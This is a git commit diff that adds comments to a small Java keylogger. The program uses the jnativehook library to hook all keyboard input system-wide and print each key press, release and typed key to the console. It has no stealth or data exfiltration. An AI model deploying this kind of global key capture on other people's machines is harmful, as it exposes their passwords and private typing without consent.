8e1f1cc837e34e69a94c36d5a0218cdf5af5df17
Sanjipan <sanjipan2003@gmail.com>
2022-11-05 12:16:16 +0530

    Comments Added

--- src/keyLogger.java
+++ src/keyLogger.java
@@ -1,3 +1,4 @@
+//Import from jnativehook jar
 import org.jnativehook.keyboard.NativeKeyListener;
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
@@ -5,27 +6,32 @@ import org.jnativehook.keyboard.NativeKeyEvent;
 
 
 public class keyLogger implements NativeKeyListener {
+
     public static void main(String[] args) {
+
         try {
             GlobalScreen.registerNativeHook();
         } catch (NativeHookException e) {
             e.printStackTrace();
         }
+
         GlobalScreen.getInstance().addNativeKeyListener(new keyLogger());
     }
 
-
     @Override
+    //Key Pressed
     public void nativeKeyPressed (NativeKeyEvent e){
         System.out.println("PRESSED:"+NativeKeyEvent.getKeyText(e.getKeyCode()));
     }
 
     @Override
+    //key Realised
     public void nativeKeyReleased (NativeKeyEvent e){
         System.out.println("REALISED:"+NativeKeyEvent.getKeyText(e.getKeyCode()));
     }
 
     @Override
+    //Key Typed
     public void nativeKeyTyped (NativeKeyEvent e){
         System.out.println("TYPED:"+NativeKeyEvent.getKeyText(e.getKeyCode()));
     }
